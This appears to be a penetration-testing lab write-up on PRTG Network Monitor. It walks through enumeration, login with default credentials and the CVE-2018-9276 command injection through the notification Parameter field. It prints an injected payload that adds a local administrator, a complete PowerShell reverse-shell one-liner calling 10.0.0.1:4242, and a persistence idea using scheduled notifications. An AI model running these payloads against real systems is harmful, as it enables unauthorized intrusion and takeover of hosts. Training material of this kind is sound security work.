
PRTG Network Monitor is a network monitoring tool made by Paessler AG. It watches your IT infrastructure like an obsessive but useful security guard. Servers, switches, firewalls, databases, virtual machines, bandwidth, even room temperature if you wire it right.

It works with an autodiscovery mode to scan areas of a network and create a device list. Once this list is created, it can gather further information from the detected devices using protocols such as ICMP, SNMP, WMI, NetFlow, and more. Devices can also communicate with the tool via a REST API. The software runs entirely from an AJAX-based website, but there is a desktop application available for Windows, Linux, and macOS.

Over the years, PRTG has suffered from [26 vulnerabilities](https://www.cvedetails.com/vulnerability-list/vendor_id-5034/product_id-35656/Paessler-Prtg-Network-Monitor.html) that were assigned CVEs. Of all of these, only four have easy-to-find public exploit PoCs, two cross-site scripting (XSS), one Denial of Service, and one authenticated command injection vulnerability which we will cover in this section. It is rare to see PRTG exposed externally, but we have often come across PRTG during internal penetration tests.

## Discovery/Footprinting/Enumeration

Typically found on port - 80, 443, 8080

```shell-session
sudo nmap -sV -p- --open -T4 10.129.201.50
```
![[Pasted image 20260223181315.png]]

PRTG also shows up in the EyeWitness scan we performed earlier. Here we can see that EyeWitness lists the default credentials `prtgadmin:prtgadmin`.

We can then explore the webpage to find other details like version
```shell
curl -s http://10.129.201.50:8080/index.htm -A "Mozilla/5.0 (compatible;  MSIE 7.01; Windows NT 5.0)" | grep version
```
![[Pasted image 20260223181339.png]]

The attacks wont work without we login in there, so -
- try to login with default, common passwords

---
## Leveraging Known Vulnerabilities

https://nvd.nist.gov/vuln/detail/CVE-2018-9276

This excellent [blog post](https://www.codewatch.org/blog/?p=453) by the individual who discovered this flaw does a great job of walking through the initial discovery process and how they discovered it. When creating a new notification, the `Parameter` field is passed directly into a PowerShell script without any type of input sanitization.

Lets do it - 

Mouse over `Setup` in the top right and then the `Account Settings` menu and finally click on `Notifications`.
![[Pasted image 20260223181602.png]]

Next, click on `Add new notification`.
![[Pasted image 20260223181649.png]]

Give the notification a name and scroll down and tick the box next to `EXECUTE PROGRAM`.
![[Pasted image 20260223181812.png]]

Under `Program File`, select `Demo exe notification - outfile.ps1` from the drop-down.
Finally, in the parameter field, enter a command. For our purposes, we will add a new local admin user by entering `test.txt;net user prtgadm1 Pwn3d_by_PRTG! /add;net localgroup administrators prtgadm1 /add`. During an actual assessment, we may want to do something that does not change the system, such as getting a reverse shell or connection to our favorite C2. Finally, click the `Save` button.
![[Pasted image 20260223210457.png]]
![[Pasted image 20260223210523.png]]
```powershell
$client = New-Object System.Net.Sockets.TCPClient('10.0.0.1',4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

And we got a shell
![[Pasted image 20260223210554.png]]


After clicking `Save`, we will be redirected to the `Notifications` page and see our new notification named `pwn` in the list.

All that is left is to click the `Test` button to run our notification and execute the command

---

Now, we could have scheduled the notification to run (and execute our command) at a later time when setting it up. This could prove handy as a persistence mechanism during a long-term engagement and is worth taking note of. Schedules can be modified in the account settings menu if we want to set it up to run at a specific time every day to get our connection back or something of that nature. At this point, all that is left is to click the `Test` button to run our notification and execute the command to add a local admin user. After clicking `Test` we will get a pop-up that says `EXE notification is queued up`. If we receive any sort of error message here, we can go back and double-check the notification settings.

Since this is a blind command execution, we won't get any feedback, so we'd have to either check our listener for a connection back or, in our case, check to see if we can authenticate to the host as a local admin. We can use `CrackMapExec` to confirm local admin access. We could also try to RDP to the box, access over WinRM, or use a tool such as [evil-winrm](https://github.com/Hackplayers/evil-winrm) or something from the [impacket](https://github.com/SecureAuthCorp/impacket) toolkit such as `wmiexec.py` or `psexec.py`.

```shell
sudo crackmapexec smb 10.129.201.50 -u prtgadm1 -p Pwn3d_by_PRTG!
```





